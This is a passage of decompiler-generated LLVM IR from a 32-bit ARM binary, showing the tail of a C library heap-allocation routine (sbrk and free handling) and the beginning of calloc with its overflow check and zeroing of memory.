  store i32 %v1_11198, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_111fc

dec_label_pc_111a4:                               ; preds = %bb167
  %v1_111a4 = load i32, i32* @r4, align 4
  %v3_111a4 = icmp ult i32 %v1_11188, %v1_111a4
  br i1 %v3_111a4, label %dec_label_pc_111ac, label %dec_label_pc_111fc

dec_label_pc_111ac:                               ; preds = %dec_label_pc_111a4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r0.global-to-local, align 4
  %v4_111b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_111b4, i32* %r2.global-to-local, align 4
  %v1_111b8 = add i32 %v4_111b4, 864
  %v2_111b8 = inttoptr i32 %v1_111b8 to i32*
  %v3_111b8 = load i32, i32* %v2_111b8, align 4
  %v0_111bc = load i32, i32* @r6, align 4
  store i32 %v0_111bc, i32* %r0.global-to-local, align 4
  %v1_111c0 = and i32 %v3_111b8, -2
  store i32 %v1_111c0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_111c0, i32* %v2_111b8, align 4
  br label %dec_label_pc_111fc

dec_label_pc_111d0:                               ; preds = %.thread43
  %v0_111d0 = load i32, i32* %r0.global-to-local, align 4
  %v3_111d0 = icmp eq i32 %v0_111d0, -1
  br i1 %v3_111d0, label %dec_label_pc_111d8, label %dec_label_pc_111f4

dec_label_pc_111d8:                               ; preds = %dec_label_pc_111d0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_111dc = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_111dc, i32* %r0.global-to-local, align 4
  %v0_111e0 = load i32, i32* @r7, align 4
  %v1_111e0 = add i32 %v0_111e0, 872
  %v2_111e0 = inttoptr i32 %v1_111e0 to i32*
  %v3_111e0 = load i32, i32* %v2_111e0, align 4
  store i32 %v3_111e0, i32* %r2.global-to-local, align 4
  %v0_111e4 = load i32, i32* @r4, align 4
  %v0_111e8 = load i32, i32* @r5, align 4
  %v2_111e4 = add i32 %v3_111e0, %v1_111dc
  %v2_111e8 = sub i32 %v2_111e4, %v0_111e4
  %v2_111ec = sub i32 %v2_111e8, %v0_111e8
  store i32 %v2_111ec, i32* %r3.global-to-local, align 4
  store i32 %v2_111ec, i32* %v2_111e0, align 4
  %v0_111f8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_111f4

dec_label_pc_111f4:                               ; preds = %dec_label_pc_111d0, %dec_label_pc_111d8
  %v0_111f8 = phi i32 [ 0, %dec_label_pc_111d0 ], [ %v0_111f8.pre, %dec_label_pc_111d8 ]
  %v0_111f4 = load i32, i32* @r4, align 4
  store i32 %v0_111f4, i32* @r7, align 4
  store i32 %v0_111f8, i32* @r5, align 4
  br label %dec_label_pc_111fc

dec_label_pc_111fc:                               ; preds = %dec_label_pc_111a4, %dec_label_pc_111ac, %dec_label_pc_11194, %dec_label_pc_111f4
  %v0_111fc = load i32, i32* %r0.global-to-local, align 4
  %v7_111fc = icmp eq i32 %v0_111fc, -1
  br i1 %v7_111fc, label %dec_label_pc_11280, label %dec_label_pc_11204

dec_label_pc_11204:                               ; preds = %dec_label_pc_111fc
  %v1_11204 = load i32, i32* @r5, align 4
  %v2_11204 = add i32 %v1_11204, %v0_111fc
  %v0_11208 = load i32, i32* @r7, align 4
  %v2_11208 = sub i32 %v2_11204, %v0_11208
  %v1_1120c = or i32 %v2_11208, 1
  %v2_11210 = add i32 %v0_11208, 4
  %v3_11210 = inttoptr i32 %v2_11210 to i32*
  store i32 %v1_1120c, i32* %v3_11210, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1121c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_1121c, i32* @r6, align 4
  %v1_11220 = add i32 %v4_1121c, 872
  %v2_11220 = inttoptr i32 %v1_11220 to i32*
  %v3_11220 = load i32, i32* %v2_11220, align 4
  %v0_11224 = load i32, i32* @r8, align 4
  %v2_11224 = icmp eq i32 %v0_11224, 0
  %v0_11228 = load i32, i32* @r5, align 4
  %v2_11228 = add i32 %v0_11228, %v3_11220
  store i32 %v2_11228, i32* %r3.global-to-local, align 4
  store i32 %v2_11228, i32* %v2_11220, align 4
  %v0_11230 = load i32, i32* @r7, align 4
  %v1_11230 = load i32, i32* @r6, align 4
  %v2_11230 = add i32 %v1_11230, 44
  %v3_11230 = inttoptr i32 %v2_11230 to i32*
  store i32 %v0_11230, i32* %v3_11230, align 4
  br i1 %v2_11224, label %dec_label_pc_11280, label %dec_label_pc_11238

dec_label_pc_11238:                               ; preds = %dec_label_pc_11204
  %v0_1123c = load i32, i32* @r8, align 4
  %v1_1123c = add i32 %v0_1123c, -12
  %v1_11240 = and i32 %v1_1123c, -8
  store i32 %v3_11008, i32* %ip.global-to-local, align 4
  %v2_11248 = add i32 %v1_11240, %v3_11008
  store i32 %v2_11248, i32* %r1.global-to-local, align 4
  %v2_1124c = icmp ugt i32 %v1_11240, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_11254 = or i32 %v1_11240, 1
  store i32 %v1_11254, i32* %r3.global-to-local, align 4
  store i32 %v1_11254, i32* %v2_11014, align 4
  %v0_1125c = load i32, i32* %r2.global-to-local, align 4
  %v1_1125c = load i32, i32* %r1.global-to-local, align 4
  %v2_1125c = add i32 %v1_1125c, 8
  %v3_1125c = inttoptr i32 %v2_1125c to i32*
  store i32 %v0_1125c, i32* %v3_1125c, align 4
  %v0_11260 = load i32, i32* %r2.global-to-local, align 4
  %v1_11260 = load i32, i32* %r1.global-to-local, align 4
  %v2_11260 = add i32 %v1_11260, 4
  %v3_11260 = inttoptr i32 %v2_11260 to i32*
  store i32 %v0_11260, i32* %v3_11260, align 4
  br i1 %v2_1124c, label %dec_label_pc_11268, label %dec_label_pc_11280

dec_label_pc_11268:                               ; preds = %dec_label_pc_11238
  %v0_11268 = load i32, i32* @r6, align 4
  %v1_11268 = add i32 %v0_11268, 836
  %v2_11268 = inttoptr i32 %v1_11268 to i32*
  %v3_11268 = load i32, i32* %v2_11268, align 4
  store i32 %v3_11268, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_11270 = load i32, i32* %ip.global-to-local, align 4
  %v1_11270 = add i32 %v0_11270, 8
  store i32 %v1_11270, i32* @r0, align 4
  store i32 -1, i32* %v2_11268, align 4
  %v0_11278 = call i32 @free()
  store i32 %v0_11278, i32* %r0.global-to-local, align 4
  %v0_1127c = load i32, i32* @r4, align 4
  %v1_1127c = load i32, i32* @r6, align 4
  %v2_1127c = add i32 %v1_1127c, 836
  %v3_1127c = inttoptr i32 %v2_1127c to i32*
  store i32 %v0_1127c, i32* %v3_1127c, align 4
  br label %dec_label_pc_11280

dec_label_pc_11280:                               ; preds = %.thread37, %dec_label_pc_11238, %dec_label_pc_11204, %dec_label_pc_111fc, %dec_label_pc_11268
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r0.global-to-local, align 4
  %v4_11288 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_11288, i32* %lr.global-to-local, align 4
  %v1_1128c = add i32 %v4_11288, 872
  store i32 %v1_1128c, i32* %r1.global-to-local, align 4
  %v1_11290 = inttoptr i32 %v1_1128c to i32*
  %v2_11290 = load i32, i32* %v1_11290, align 4
  store i32 %v2_11290, i32* %r1.global-to-local, align 4
  %v3_11290 = add i32 %v4_11288, 876
  %v4_11290 = inttoptr i32 %v3_11290 to i32*
  %v5_11290 = load i32, i32* %v4_11290, align 4
  store i32 %v5_11290, i32* %r3.global-to-local, align 4
  %v1_11298 = add i32 %v4_11288, 868
  %v2_11298 = inttoptr i32 %v1_11298 to i32*
  %v3_11298 = load i32, i32* %v2_11298, align 4
  store i32 %v3_11298, i32* %r3.global-to-local, align 4
  %v1_1129c = add i32 %v4_11288, 884
  %v2_1129c = inttoptr i32 %v1_1129c to i32*
  %v3_1129c = load i32, i32* %v2_1129c, align 4
  store i32 %v3_1129c, i32* %r2.global-to-local, align 4
  %v2_112a0 = add i32 %v3_11298, %v2_11290
  store i32 %v2_112a0, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_11290, %v5_11290
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_11280
  store i32 %v2_11290, i32* %v4_11290, align 4
  %v0_112a8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_112a8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_11280, %bb168
  %v1_112a8 = phi i32 [ %v3_1129c, %dec_label_pc_11280 ], [ %v1_112a8.pre, %bb168 ]
  %v4_112ac = phi i32 [ %v2_112a0, %dec_label_pc_11280 ], [ %v0_112a8.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_112ac, %v1_112a8
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_112ac = load i32, i32* %lr.global-to-local, align 4
  %v6_112ac = add i32 %v5_112ac, 884
  %v7_112ac = inttoptr i32 %v6_112ac to i32*
  store i32 %v4_112ac, i32* %v7_112ac, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_112b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_112b0 = add i32 %v0_112b0, 44
  %v2_112b0 = inttoptr i32 %v1_112b0 to i32*
  %v3_112b0 = load i32, i32* %v2_112b0, align 4
  store i32 %v3_112b0, i32* %ip.global-to-local, align 4
  %v1_112b4 = add i32 %v3_112b0, 4
  %v2_112b4 = inttoptr i32 %v1_112b4 to i32*
  %v3_112b4 = load i32, i32* %v2_112b4, align 4
  store i32 %v1_10ec8, i32* %r1.global-to-local, align 4
  %v1_112bc = and i32 %v3_112b4, -4
  store i32 %v1_112bc, i32* %r3.global-to-local, align 4
  %v3_112c0 = icmp ult i32 %v1_112bc, %v1_10ec8
  br i1 %v3_112c0, label %dec_label_pc_112ec, label %dec_label_pc_112c8

dec_label_pc_112c8:                               ; preds = %bb171
  %v0_112c8 = load i32, i32* @sl, align 4
  %v2_112c8 = sub i32 %v1_112bc, %v0_112c8
  %v2_112cc = add i32 %v0_112c8, %v3_112b0
  store i32 %v2_112cc, i32* %r1.global-to-local, align 4
  %v1_112d0 = or i32 %v2_112c8, 1
  store i32 %v1_112d0, i32* %r3.global-to-local, align 4
  %v1_112d4 = or i32 %v0_112c8, 1
  store i32 %v1_112d4, i32* %r2.global-to-local, align 4
  %v1_112d8 = add i32 %v3_112b0, 8
  store i32 %v1_112d8, i32* %r0.global-to-local, align 4
  store i32 %v1_112d4, i32* %v2_112b4, align 4
  %v0_112e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_112e0 = load i32, i32* %lr.global-to-local, align 4
  %v2_112e0 = add i32 %v1_112e0, 44
  %v3_112e0 = inttoptr i32 %v2_112e0 to i32*
  store i32 %v0_112e0, i32* %v3_112e0, align 4
  %v0_112e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_112e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_112e4 = add i32 %v1_112e4, 4
  %v3_112e4 = inttoptr i32 %v2_112e4 to i32*
  store i32 %v0_112e4, i32* %v3_112e4, align 4
  br label %dec_label_pc_11304

dec_label_pc_112ec:                               ; preds = %bb160, %bb171, %dec_label_pc_110c8
  store i32 64080, i32* %r3.global-to-local, align 4
  %v0_112f0 = call i32 @__aeabi_read_tp()
  %v3_112f4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_112f4 = sext i16 %v3_112f4 to i32
  store i32 %v4_112f4, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_112fc = add i32 %v4_112f4, %v0_112f0
  %v4_112fc = inttoptr i32 %v3_112fc to i32*
  store i32 12, i32* %v4_112fc, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11304

dec_label_pc_11304:                               ; preds = %bb154, %bb153, %dec_label_pc_112c8, %dec_label_pc_10f10, %dec_label_pc_112ec
  %v0_11304 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11304, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11308

dec_label_pc_11308:                               ; preds = %.thread4, %dec_label_pc_10edc, %.thread124, %dec_label_pc_10d4c, %dec_label_pc_10d40, %dec_label_pc_10ba8, %dec_label_pc_10b2c, %dec_label_pc_11304
  store i32 %v2_10a4c, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r2.global-to-local, align 4
  %v4_11318 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 44) to i32*), align 4
  store i32 %v4_11318, i32* @ip, align 4
  store i32 70436, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11318)
  br label %dec_label_pc_11324

dec_label_pc_11324:                               ; preds = %dec_label_pc_10a84, %dec_label_pc_11308
  %v0_11324 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11324, i32* %r0.global-to-local, align 4
  store i32 %v3_10a20, i32* @r4, align 4
  store i32 %v6_10a20, i32* @r5, align 4
  store i32 %v9_10a20, i32* @r6, align 4
  store i32 %v12_10a20, i32* @r7, align 4
  store i32 %v15_10a20, i32* @r8, align 4
  store i32 %v18_10a20, i32* @sb, align 4
  store i32 %v21_10a20, i32* @sl, align 4
  store i32 %v24_10a20, i32* @fp, align 4
  store i32 %v27_10a20, i32* @lr, align 4
  ret i32 %v0_11324

; uselistorder directives
  uselistorder i32 %v0_112c8, { 1, 0, 2 }
  uselistorder i32 %v3_112b0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_112ac, { 1, 0 }
  uselistorder i32 %v2_11290, { 2, 0, 1, 3 }
  uselistorder i32 %v4_11288, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_11240, { 1, 2, 0 }
  uselistorder i32 %v0_11208, { 1, 0 }
  uselistorder i32 %v0_111fc, { 1, 0 }
  uselistorder i32 %v2_111ec, { 1, 0 }
  uselistorder i32 %v2_1117c, { 2, 1, 0 }
  uselistorder i32 %v2_11164, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1115c, { 1, 0, 2 }
  uselistorder i32 %v1_11158, { 2, 1, 0 }
  uselistorder i32 %v0_11158, { 3, 1, 2, 0 }
  uselistorder i32 %v1_1113c, { 1, 0 }
  uselistorder i32 %v2_11114, { 1, 0 }
  uselistorder i32 %v3_11108, { 1, 0, 2 }
  uselistorder i32 %v2_110e8, { 1, 0, 2 }
  uselistorder i32* %v2_110e0, { 1, 0, 2 }
  uselistorder i32 %v0_110c8, { 1, 0 }
  uselistorder i32 %v6_110a4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11090, { 2, 1, 0 }
  uselistorder i32 %v0_11078, { 1, 0 }
  uselistorder i32 %v2_11034, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11030, { 1, 0 }
  uselistorder i32 %v3_11008, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_10fe8, { 1, 0, 2 }
  uselistorder i32 %v2_10fd0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10f78, { 2, 1, 0 }
  uselistorder i32 %v6_10f6c, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_10f48, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10f08, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10ec8, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_10ec0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10ebc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_10ea8, { 1, 0 }
  uselistorder i32 %v7_10e68, { 1, 0 }
  uselistorder i32 %v4_10e68, { 1, 0 }
  uselistorder i32 %v0_10e38, { 1, 0 }
  uselistorder i32 %v2_10e0c, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_10e0857, { 1, 0 }
  uselistorder i32 %v1_10dd4, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_10dbc., { 1, 2, 0 }
  uselistorder i32 %v0_10dc4, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10dc4, { 1, 0 }
  uselistorder i32 %v3_10da4, { 1, 0 }
  uselistorder i32 %v4_10da0, { 1, 0, 2 }
  uselistorder i32 %v1_10d10, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10d68, { 1, 0 }
  uselistorder i32 %v1_10d4c, { 1, 0 }
  uselistorder i32 %v1_10bec, { 1, 0 }
  uselistorder i32 %v0_10d2c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_10cf4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10d88.pre, { 1, 2, 0 }
  uselistorder i32 %v0_10cd0, { 2, 1, 0 }
  uselistorder i32 %v3_10cc4, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_10be4, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_10c8c, { 1, 0 }
  uselistorder i32 %v3_10c80, { 1, 0 }
  uselistorder i32 %v0_10c8c, { 1, 0 }
  uselistorder i32 %v3_10c64, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10c54, { 1, 0, 2 }
  uselistorder i32 %v3_10c0c, { 2, 1, 0 }
  uselistorder i32 %v0_10bfc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_10bcc, { 1, 0 }
  uselistorder i32 %v1_10b80, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10b7c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_10b20, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_10b14, { 1, 0 }
  uselistorder i32 %v3_10ae4, { 1, 0 }
  uselistorder i32 %v0_10ad8, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_10ab8, { 0, 2, 1, 3 }
  uselistorder i1 %v7_10aac, { 1, 0 }
  uselistorder i32 %v0_10a7c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 43, 40, 41, 42, 44, 45, 46, 47, 50, 51, 48, 49, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 0, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 27, 1, 3, 4, 5, 17, 9, 6, 18, 7, 8, 11, 10, 15, 12, 19, 14, 13, 20, 16, 24, 22, 21, 23, 26, 25, 28, 56, 29, 30, 57, 31, 32, 33, 34, 35, 38, 39, 36, 37, 44, 41, 40, 42, 43, 45, 50, 46, 47, 48, 49, 52, 51, 55, 54, 53 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 42, 22, 23, 35, 34, 27, 24, 0, 25, 26, 28, 29, 30, 31, 32, 33, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 34, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_11324, { 1, 0 }
  uselistorder label %dec_label_pc_11308, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_11304, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_112ec, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_11280, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_111fc, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_111f4, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_110c8, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_10ffc, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_10eb4, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_10e08, { 1, 0 }
  uselistorder label %dec_label_pc_10e10.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10d88, { 1, 0 }
  uselistorder label %dec_label_pc_10d1c, { 1, 0 }
  uselistorder label %dec_label_pc_10d18, { 1, 0 }
  uselistorder label %dec_label_pc_10cc4, { 1, 0 }
  uselistorder label %dec_label_pc_10cb0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c78, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10c64, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_11338(i32 %arg1) local_unnamed_addr {
dec_label_pc_11338:
  %v0_11338 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11338, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_11338
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11338, %bb
  %v4_11354 = phi i32 [ %arg1, %dec_label_pc_11338 ], [ 0, %bb ]
  ret i32 %v4_11354

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_11358 = load i32, i32* @r4, align 4
  %v6_11358 = load i32, i32* @r5, align 4
  %v9_11358 = load i32, i32* @r6, align 4
  %v12_11358 = load i32, i32* @lr, align 4
  %v2_11360 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_11370 = mul i32 %arg2, %arg1
  store i32 %v2_11370, i32* @r6, align 4
  br i1 %v2_11360, label %dec_label_pc_113a8, label %dec_label_pc_11378

dec_label_pc_11378:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_11380 = udiv i32 %v2_11370, %arg1
  %v9_11384 = icmp eq i32 %v2_11380, %arg2
  br i1 %v9_11384, label %dec_label_pc_113a8, label %dec_label_pc_1138c

dec_label_pc_1138c:                               ; preds = %dec_label_pc_11378
  %v0_11390 = call i32 @__aeabi_read_tp()
  %v3_11394 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_11394 = sext i16 %v3_11394 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_113a0 = add i32 %v4_11394, %v0_11390
  %v4_113a0 = inttoptr i32 %v3_113a0 to i32*
  store i32 12, i32* %v4_113a0, align 4
  br label %dec_label_pc_1146c

dec_label_pc_113a8:                               ; preds = %dec_label_pc_11378, %entry
  %v4_113ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 108) to i32*), align 4
  store i32 %v4_113ac, i32* @r4, align 4
  %v4_113c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 112) to i32*), align 4
  store i32 %v4_113c4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_113c4)
  %v0_113d8 = load i32, i32* @r5, align 4
  %v2_113d8 = add i32 %v0_113d8, 16
  %v3_113d8 = inttoptr i32 %v2_113d8 to i32*
  %v4_113d8 = load i32, i32* %v3_113d8, align 4
  store i32 %v4_113d8, i32* %ip.global-to-local, align 4
  store i32 70628, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_113d8)
  %v0_113e4 = load i32, i32* @r6, align 4
  store i32 %v0_113e4, i32* @r0, align 4
  %v0_113e8 = call i32 @malloc()
  store i32 %v0_113e8, i32* %r4.global-to-local, align 4
  %v2_113ec = icmp eq i32 %v0_113e8, 0
  br i1 %v2_113ec, label %.thread, label %dec_label_pc_113f4

dec_label_pc_113f4:                               ; preds = %dec_label_pc_113a8
  %v1_113f4 = add i32 %v0_113e8, -4
  %v2_113f4 = inttoptr i32 %v1_113f4 to i32*
  %v3_113f4 = load i32, i32* %v2_113f4, align 4
  %v1_113f8 = and i32 %v3_113f4, 2
  %v2_113f8 = icmp eq i32 %v1_113f8, 0
  br i1 %v2_113f8, label %dec_label_pc_11400, label %.thread

dec_label_pc_11400:                               ; preds = %dec_label_pc_113f4
  %v1_114006 = add i32 %v3_113f4, -4
  %v1_11404 = and i32 %v1_114006, -4
  %v3_11408 = udiv i32 %v1_11404, 4
  store i32 %v3_11408, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_11404, 36
  %v2_11410 = icmp ult i32 %v1_11404, 33
  %v3_11410 = or i1 %tmp, %v2_11410
  br i1 %v3_11410, label %dec_label_pc_1141c, label %dec_label_pc_11414

dec_label_pc_11414:                               ; preds = %dec_label_pc_11400
  %v3_11414 = inttoptr i32 %v0_113e8 to i8*
  %v4_11414 = call i32 @__GI_memset(i8* %v3_11414, i32 0, i32 %v1_11404)
  br label %.thread

dec_label_pc_1141c:                               ; preds = %dec_label_pc_11400
  %tmp7 = icmp eq i32 %v1_11404, 16
  %v2_11420 = inttoptr i32 %v0_113e8 to i32*
  store i32 0, i32* %v2_11420, align 4
  %v1_11424 = load i32, i32* %r4.global-to-local, align 4
  %v2_11424 = add i32 %v1_11424, 4
  %v3_11424 = inttoptr i32 %v2_11424 to i32*
  store i32 0, i32* %v3_11424, align 4
  %v1_11428 = load i32, i32* %r4.global-to-local, align 4
  %v2_11428 = add i32 %v1_11428, 8
  %v3_11428 = inttoptr i32 %v2_11428 to i32*
  store i32 0, i32* %v3_11428, align 4
  %v2_1142c = icmp ult i32 %v1_11404, 13
  %v3_1142c = or i1 %tmp7, %v2_1142c
  br i1 %v3_1142c, label %.thread, label %dec_label_pc_11430

dec_label_pc_11430:                               ; preds = %dec_label_pc_1141c
  %v0_11430 = load i32, i32* %ip.global-to-local, align 4
  %v1_11434 = load i32, i32* %r4.global-to-local, align 4
  %v2_11434 = add i32 %v1_11434, 12
  %v3_11434 = inttoptr i32 %v2_11434 to i32*
  store i32 0, i32* %v3_11434, align 4
  %v1_11438 = load i32, i32* %r4.global-to-local, align 4
  %v2_11438 = add i32 %v1_11438, 16
  %v3_11438 = inttoptr i32 %v2_11438 to i32*
  store i32 0, i32* %v3_11438, align 4
  %tmp8 = icmp ult i32 %v0_11430, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_11440

dec_label_pc_11440:                               ; preds = %dec_label_pc_11430
  %v0_11440 = load i32, i32* %ip.global-to-local, align 4
  %v7_11440 = icmp eq i32 %v0_11440, 9
  %v1_11444 = load i32, i32* %r4.global-to-local, align 4
  %v2_11444 = add i32 %v1_11444, 20
  %v3_11444 = inttoptr i32 %v2_11444 to i32*
  store i32 0, i32* %v3_11444, align 4
  %v1_11448 = load i32, i32* %r4.global-to-local, align 4
  %v2_11448 = add i32 %v1_11448, 24
  %v3_11448 = inttoptr i32 %v2_11448 to i32*
  store i32 0, i32* %v3_11448, align 4
  br i1 %v7_11440, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11440
  %v2_1144c = load i32, i32* %r4.global-to-local, align 4
